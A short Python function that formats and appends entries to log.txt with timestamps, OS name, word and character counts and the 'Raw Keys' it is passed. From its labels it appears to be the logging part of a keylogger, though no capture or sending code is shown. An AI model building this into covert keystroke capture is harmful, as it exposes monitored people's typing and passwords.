import datetime, platform, re

def finalize_log(raw_data):
    # Calculate metrics
    words = len(raw_data.split())
    spaces = raw_data.count(' ')
    specials = len(re.findall(r'[^a-zA-Z0-9\s]', raw_data))
    
    # Timestamp formatting
    now = datetime.datetime.now()
    timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
    day = now.strftime("%A")
    
    # Assemble the block
    log_entry = (
        f"--- {platform.system()} ---\n"
        f"Date: {now.strftime('%Y-%m-%d')} | Time: {now.strftime('%H:%M:%S')} | Day: {day}\n"
        f"Words Captured: {words} | Spaces Captured: {spaces} | Special Characters: {specials}\n"
        f"Raw Keys: {raw_data}\n"
        f"{'='*40}\n\n"
    )
    
    with open("log.txt", "a") as f:
        f.write(log_entry)
